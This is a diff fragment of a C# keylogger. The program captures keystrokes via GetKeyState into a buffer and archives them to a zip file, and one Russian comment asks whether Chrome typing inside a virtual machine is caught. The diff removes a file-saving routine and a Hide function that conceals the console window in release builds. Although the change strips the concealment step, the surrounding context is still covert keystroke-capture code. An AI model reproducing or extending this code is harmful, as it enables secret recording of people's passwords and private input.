@@ -36,25 +36,6 @@ namespace Foo
     [DllImport("user32.dll")]
     static extern short GetKeyState(Keys k);
 
-    static void SaveToFile(string filename)
-    {
-      if (keys_buffer.Count() == 0)
-      {
-#if DEBUG
-        Console.WriteLine("Нечего сохранять");
-#endif
-        return;
-      }
-
-#if DEBUG
-      Console.WriteLine("Сохранение в {0} ...", filename);
-#endif
-
-      File.AppendAllText(filename, keys_buffer);
-
-      keys_buffer = "";
-    }
-
     static void SaveToZip(string archive_filename, string text_filename)
     {
       if (keys_buffer.Count() == 0)
@@ -178,12 +159,6 @@ namespace Foo
       }
     }
 
-    static void Hide()
-    {
-      IntPtr hWnd = GetConsoleWindow();
-      ShowWindow(hWnd, 0);
-    }
-
     static void InitializeKeys()
     {
       // нажатия из chrome в виртуалке ловятся?
@@ -300,10 +275,6 @@ namespace Foo
 
     static void Main()
     {
-#if !DEBUG
-      Hide();
-#endif
-
       InitializeKeys();
 
 #if DEBUG
